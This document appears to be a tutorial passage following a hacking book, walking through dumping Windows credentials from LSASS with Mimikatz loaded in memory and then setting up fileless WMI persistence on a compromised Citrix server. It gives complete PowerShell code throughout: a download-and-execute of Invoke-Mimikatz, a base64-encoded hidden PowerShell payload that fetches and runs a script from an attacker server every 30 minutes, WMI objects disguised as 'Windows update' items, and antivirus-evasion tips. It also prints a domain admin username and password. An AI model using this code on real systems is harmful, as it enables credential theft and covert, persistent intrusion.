# Mimikatz and persistence with WMI:

This section continues from the previous cookbook on Citrix and follows demonstrations from the book "How to Hack Like a GOD: Master the Secrets of Hacking Through Real Life Scenarios" (continuing from page 73).

Mimikatz, developed by Gentilkiwi, is a powerful tool for exploring the internals of Windows authentication mechanisms. It reveals that after a user logs in, their passwords are stored in memory within the Local Security Authority Subsystem Service (LSASS) process.

*Note: LSASS is a critical system process in Windows operating systems responsible for enforcing the security policy on a system. It handles various security-related tasks and is crucial for maintaining the integrity of user authentication and authorization.*

*LSASS manages user logins and authenticates users. It processes credentials and verifies user identity against stored credentials or authentication services.*

*Once a user is authenticated, LSASS creates an access token. This token contains information about the user’s identity and their permissions, which is used to grant or deny access to system resources.*

*On domain-joined systems, LSASS interacts with Active Directory (AD) to authenticate users and validate security policies. It handles requests for domain logons and communicates with AD controllers to validate credentials.*

*LSASS enforces local security policies, including password policies, account lockout policies, and user rights assignments. It ensures that user actions comply with security policies set on the machine.*

*LSASS caches credentials in memory to speed up logon processes and provide offline access to systems. This is where Mimikatz can extract plaintext passwords if it has access to the memory space of LSASS.*

*To protect LSASS, Windows implements various security mechanisms such as credential guard and process isolation. However, vulnerabilities and misconfigurations can still expose sensitive information.*

As for Mimikatz, it uses undocumented Windows functions to decrypt these passwords and display them in clear text—a remarkable feat that remains effective even after many years.

Mimikatz has become a reference tool in hacking and pentesting Windows environments due to its extensive capabilities. Its success led to its integration into most Windows attacking tools. For example, Cymb3r created a PowerShell wrapper that runs Mimikatz in memory, leaving no trace on disk—no files and no antivirus alerts.

Using the elevated command prompt obtained earlier, we can launch PowerShell and execute Mimikatz. Here’s the process:

```
PS > $browser = New-Object System.Net.WebClient
PS > $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

PS > mimi = $browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1")
PS > Invoke-Expression($mimi)

PS > Invoke-Mimikatz
```

Quick breakdown:

- $browser = New-Object System.Net.WebClient: Creates a new instance of the System.Net.WebClient class, which is used to download files from the internet.

- $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials: Sets the proxy credentials to the default network credentials of the current user, allowing the WebClient to authenticate if needed.

- mimi = $browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"): Downloads the Mimikatz PowerShell script from a GitHub repository and stores it in the $mimi variable.

- Invoke-Expression($mimi): Executes the downloaded Mimikatz script in memory.

- Invoke-Mimikatz: Calls the function to run Mimikatz and display the decrypted credentials.
	
This approach effectively utilizes PowerShell to run Mimikatz without leaving files on disk, thereby avoiding detection by traditional antivirus systems.

As demonstrated in the book, credentials are literally pouring down! Of the hundred or so users, we surely get our promised gift: a GBSHOP domain admin account: rachel_adm/Emma*Gryff12

Before embarking on new adventures, we need to 'save' our current position in case we lose access to the Citrix server due to an unscheduled restart, a disabled account, or other unforeseen circumstances. While we can always re-access the system through the PI backdoor or the Empire agent on the initially compromised user's computer and start over, it would be more efficient to have the Citrix server automatically check in every 10 minutes to ensure everything is functioning properly.

There are several methods to achieve this:

- Registry Keys: Set up registry keys that execute programs when users log in. This approach is ideal for a virtualization server, but it has drawbacks. Depending on the registry key used, it could be detected by many basic investigation tools. Keys such as HKCU\Software\Microsoft\Windows\CurrentVersion\Run or HKLM\Software\Microsoft\Windows\CurrentVersion\Run are commonly monitored.

- Scheduled Tasks: Create a scheduled task that fetches and executes a PowerShell script every 15 minutes. This method is very reliable but somewhat primitive. The task and its payload will be visible to any admin on the server, making it easy to detect. For example, you could use a command like: schtasks /create /tn "PhoneHome" /tr "powershell.exe -File C:\path\to\script.ps1" /sc minute /mo 15
	
- EXE or DLL Hijacking: This involves placing a fake DLL or EXE with the same name as a missing one that regular tools tend to blindly load at startup. When the system or applications look for these files, they will execute the malicious version instead. This method can be highly effective but requires careful planning to avoid detection. Common targets for this technique include DLLs in system directories or application folders that are known to be vulnerable to hijacking.

These are all valid techniques, but they are either too obvious or require files on disk, which is not very stealthy. Instead, we'll use an interesting ‘file-less’ technique relying on Windows Management Instrumentation (WMI) Filters.

We have already used a WMI tool to issue RPC functions and execute commands (wmiexec on Linux and wmic.exe on Windows). In fact, WMI is far more powerful, offering almost unique ways to interact with Windows' internal components.

One such interesting component is the event filter. It can tie an event on the machine, such as process creation or user logon, to an action to perform, like executing a command.

We will set up an event watcher using WMI and instruct it to execute a PowerShell command that phones home when the event is triggered. For this, we'll configure three WMI components:

- A WMI registered event, which can be a simple 30-minute timer.
- A WMI registered filter that will monitor this event and raise an alert when it is triggered.
- A WMI consumer that represents the action to perform once the filter raises an alert."

We begin by registering a 30-minute timer in PowerShell. This timer will help us schedule events at regular intervals:

```
PS > $TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 1800000) # 30 minutes in milliseconds
    SkipIfPassed = $False
    TimerId = "Trigger" 
}
```

Notes:

- The "@" character in PowerShell is used to create a hashtable. A hashtable is a collection of key-value pairs, where each key is unique and is used to access its corresponding value. This hashtable is then assigned to the $TimerArgs variable, which can be used later as an argument for functions that expect hashtable input, such as Set-WmiInstance.

- IntervalBetweenEvents: This sets the timer interval to 30 minutes (1800000 milliseconds).

- SkipIfPassed: This parameter determines if the timer should skip intervals that have already passed. Setting it to $False ensures that the timer will not skip intervals.

- TimerId: This is an identifier for the timer event.

Next, we create an _IntervalTimerInstruction object based on this timer. This class belongs to the default namespace root/cimv2, which contains many operating system class objects and functions:

```
PS > $Timer = Set-WmiInstance -Namespace root/cimv2 `
    -Class __IntervalTimerInstruction -Arguments $TimerArgs
```

Notes:

- Set-WmiInstance: This cmdlet is used to create or update an instance of a WMI class. A cmdlet is a lightweight command used in PowerShell. It performs a specific function, such as managing system resources or handling data. Cmdlets are built into PowerShell and are designed to be used within scripts or directly in the command line to automate tasks and interact with the system. They follow a verb-noun naming pattern, like Get-Process or Set-Content.

- Namespace root/cimv2: Specifies the WMI namespace where the class resides. Namespaces define a scope for class definitions and object instances. They help in organizing and categorizing objects, such as root/cimv2 in WMI, where root is the top-level namespace, and cimv2 is a subnamespace containing various system management classes.

- Class __IntervalTimerInstruction: Refers to the WMI class that handles timer events. The class __IntervalTimerInstruction is part of the root/cimv2 namespace.

- Arguments $TimerArgs: Passes the timer arguments defined earlier.

With the event set, we now need to create a filter to monitor when this event is triggered. We use a WQL (WMI Query Language) query to look for our specific timer event among the numerous events generated by Windows:

```
PS > $EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "Windows update trigger"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
    QueryLanguage = 'WQL'
}
```

Notes:

- EventNamespace: Specifies the WMI namespace where the event filter class resides.

- Name: A descriptive name for the event filter.

- Query: This WQL query selects all events from the __TimerEvent class where the TimerID matches 'Trigger'.

- QueryLanguage: Specifies that the query language used is WQL.

We then instantiate an object belonging to the __EventFilter class to register this filter:

```
PS > $Filter = Set-WmiInstance -Namespace root/subscription `
    -Class __EventFilter -Arguments $EventFilterArgs
```

Notes:

- Namespace root/subscription: Specifies the namespace for event subscriptions.
 
- Class __EventFilter: Refers to the WMI class responsible for filtering events.
 
- Arguments $EventFilterArgs: Passes the event filter arguments.

So, here is a quick summary of stages (or steps if you will) we have used so far:

1. Defining parameters: $TimerArgs, $EventFilterArgs

2. Creating objects: $Timer, $Filter

Each block represents a distinct stage in the process, with variables serving as containers for configurations or objects created at that stage. This organized approach helps in modularizing the setup, making it clearer and easier to manage.

To perform an action every time the event is triggered, we use a WMI Consumer to execute a command. This command can be configured to download and run a script from a server. For example, a simple "hello" script might be used initially to avoid spawning multiple shells on the machine. If access via the Empire agent is lost, we can replace the "hello" script with a new Empire agent to re-establish the reverse shell access.

Our payload will be a simple web client script that downloads a file—taking proxy settings into account—and then executes it. We will encode the payload to ease inline command execution, similar to how Empire handles it.

First, we define the payload in PowerShell:

```
PS > $payload = '$browser=New-Object System.Net.WebClient;
$browser.Proxy.Credentials =
[System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString("http://<AttackSrv>/script.txt"));'
```

Quick breakdown:

- $browser=New-Object System.Net.WebClient;: This line creates a new web client object to handle the download.

- $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;: This ensures the web client uses the default network credentials, useful if the system requires proxy authentication.

- IEX($browser.DownloadString("http://<AttackSrv>/script.txt"));: This line downloads the script from the specified URL and executes it using Invoke-Expression (IEX).

Next, we encode the payload to facilitate its execution:

```
PS > $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
PS > $FinalPayload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc $EncodedPayload"
```

Quick breakdown:

- $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload)): This converts the payload into a Base64-encoded string, making it easier to pass as a command-line argument.

	- [Convert]::ToBase64String(...): This is calling the static method ToBase64String from the [Convert] class, which is part of the .NET framework. The [Convert] class provides methods for converting various data types to other types, such as converting binary data to a Base64-encoded string.

	- [Text.Encoding]::Unicode.GetBytes($payload): Here, [Text.Encoding] is another class from the .NET framework. It handles text encoding. Specifically, Unicode is a property of [Text.Encoding] that provides a UnicodeEncoding object, which is used to encode text as Unicode.

	- Parentheses () are used to group expressions and indicate the order of operations. Inside the parentheses, you perform the method calls and operations:

	- [Text.Encoding]::Unicode.GetBytes($payload): This converts the string $payload into an array of bytes using Unicode encoding.

- $FinalPayload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc $EncodedPayload": This constructs the final command to execute the encoded payload in a hidden PowerShell session with no profile loaded (-NoP), in single-threaded apartment mode (-sta), and without interactive input (-NonI).

The script.txt file referenced in the payload should contain a simple PowerShell script. Initially, this script will just send a "hello" message to ensure connectivity. If we lose access to the Empire agent, we can replace this with a more complex script, such as a stager, to reestablish reverse shell access.

Here's an example of a simple "hello" script for script.txt (when needed, this script can be replaced with a more complex payload):

```
# script.txt
Write-Output "Hello, the connection is established successfully!"
```

After setting up the timer and event filter, the next step is to create a WMI consumer object that will execute a command when the specified event is triggered. The CommandLineConsumer object needs to be configured with specific arguments. Here, you define a Name for the consumer and a CommandLineTemplate that contains the payload to be executed. The CommandLineTemplate will use the FinalPayload variable which holds the encoded PowerShell command:

```
PS > $CommandLineConsumerArgs = @{
    Name = "Windows update consumer"
    CommandLineTemplate = $FinalPayload
}
```

- Name: A descriptive name for the consumer object. This is how you'll identify it in WMI.

- CommandLineTemplate: The PowerShell command that should be executed when the event is triggered. This template uses the $FinalPayload variable, which encodes a command to download and execute a script from a remote server.

Registering the consumer:

Use the Set-WmiInstance cmdlet to create an instance of the CommandLineEventConsumer class (with the arguments defined above):

```
PS > $Consumer = Set-WmiInstance -Namespace root/subscription `
    -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs
```

- Namespace: root/subscription is the namespace where the CommandLineEventConsumer class resides.

- Class: CommandLineEventConsumer is the class that defines the behavior for executing a command.

- Arguments: $CommandLineConsumerArgs contains the configuration for the consumer, including the command to be executed.

The CommandLineEventConsumer ensures that the command defined in FinalPayload runs whenever the event occurs. This is a powerful method for maintaining persistence on a system.

The final step is to link the event filter to the command line consumer. This linkage is accomplished through a WMI object called a Binding object. First, we need to specify which filter and consumer will be linked. This is done by creating an arguments hashtable that includes both the filter and the consumer objects:

```
PS > $FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
```

- Filter: This is the event filter object that was set up earlier. It monitors for the event.

- Consumer: This is the command line consumer object that executes the command when the event is detected.

Creating the binding:

Use the Set-WmiInstance cmdlet to create an instance of the __FilterToConsumerBinding class, which establishes the connection between the filter and the consumer:

```
PS > $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription `
    -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
```

- Namespace: root/subscription is where the __FilterToConsumerBinding class is located.

- Class: __FilterToConsumerBinding is the WMI class that links the filter with the consumer.

- Arguments: $FilterToConsumerArgs contains the Filter and Consumer objects that need to be linked.

After completing this setup, the Citrix server will periodically request the script.txt file from the specified URL. Initially, this file can contain a simple or harmless command for testing purposes. Once access is lost, we can replace the contents of script.txt with a more complex payload, such as an Empire stager, to regain control.

So, here's a high-level review of what we’ve done with the WMI persistence code:

- Timer: Triggers periodically.

- Filter: Monitors for timer events.

- Consumer: Executes the payload when the event occurs.

- Binding: Connects the filter with the consumer.

The entire code goes like this:

```
PS > $TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 1800000) # 30 minutes in milliseconds
    SkipIfPassed = $False
    TimerId = "Trigger" 
}

PS > $Timer = Set-WmiInstance -Namespace root/cimv2 `
    -Class __IntervalTimerInstruction -Arguments $TimerArgs
	
PS > $EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = "Windows update trigger"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
    QueryLanguage = 'WQL'
}

PS > $Filter = Set-WmiInstance -Namespace root/subscription `
    -Class __EventFilter -Arguments $EventFilterArgs

PS > $payload = '$browser=New-Object System.Net.WebClient;
$browser.Proxy.Credentials =
[System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString("http://<AttackSrv>/script.txt"));'

PS > $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
PS > $FinalPayload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc $EncodedPayload"

PS > $CommandLineConsumerArgs = @{
    Name = "Windows update consumer"
    CommandLineTemplate = $FinalPayload
}

PS > $Consumer = Set-WmiInstance -Namespace root/subscription `
    -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

PS > $FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}

PS > $FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription `
    -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
```

Key points to remember:

    1. Timer Setup
        Objective: Create a timer that triggers every 30 minutes.
        Components: $TimerArgs, __IntervalTimerInstruction.

    2. Event Filter
        Objective: Define a filter to monitor the timer event.
        Components: $EventFilterArgs, __EventFilter.

    3. Payload Creation
        Objective: Prepare a PowerShell command that downloads and executes a script.
        Components: $payload, $EncodedPayload, $FinalPayload.

    4. Command Line Consumer
        Objective: Create a consumer that executes the PowerShell command defined in $FinalPayload.
        Components: $CommandLineConsumerArgs, CommandLineEventConsumer.

    5. Binding
        Objective: Link the event filter to the consumer to ensure the command executes when the event is triggered.
        Components: $FilterToConsumerArgs, __FilterToConsumerBinding.
		
In my opinion the best approach would be storing the entire WMI persistence setup code in a PowerShell script file (e.g., setup_wmi_persistence.ps1). Once we have a privileged PowerShell session on the target (Citrix) machine (which we can obtain via wmiexec.py or any other means), we can execute the script:

```
.\setup_wmi_persistence.ps1
```

Note: when saving the script to a .ps1 file, you should remove the "PS >" prompts. These prompts are just visual indicators for command-line input and are not part of the actual commands. 

Also, instead of saving the script to a file, we can use the System.Net.WebClient class to download the script content and then use Invoke-Expression to execute it directly in memory:

```
# Initialize the WebClient object
$browser = New-Object System.Net.WebClient

# Set proxy credentials if needed
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials

# Download the persistence script content from the URL
$scriptUrl = "http://<AttackSrv>/setup_wmi_persistence.ps1"
$scriptContent = $browser.DownloadString($scriptUrl)

# Execute the downloaded script in memory
Invoke-Expression($scriptContent)
```

Note: if we need to encode the script in Base64, we can do it as follows:

```
$scriptPath = "C:\path\to\your\setup_wmi_persistence.ps1"
$scriptContent = Get-Content -Path $scriptPath -Raw
$encodedScript = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
```

We can then use the Base64 encoded string in a downloading and execution script:

```
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$encodedScriptUrl = "http://<AttackSrv>/encoded_script.txt"
$encodedScriptContent = $browser.DownloadString($encodedScriptUrl)
$decodedScript = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedScriptContent))
Invoke-Expression($decodedScript)
```

Of course, this is optional but can be used for additional obfuscation.
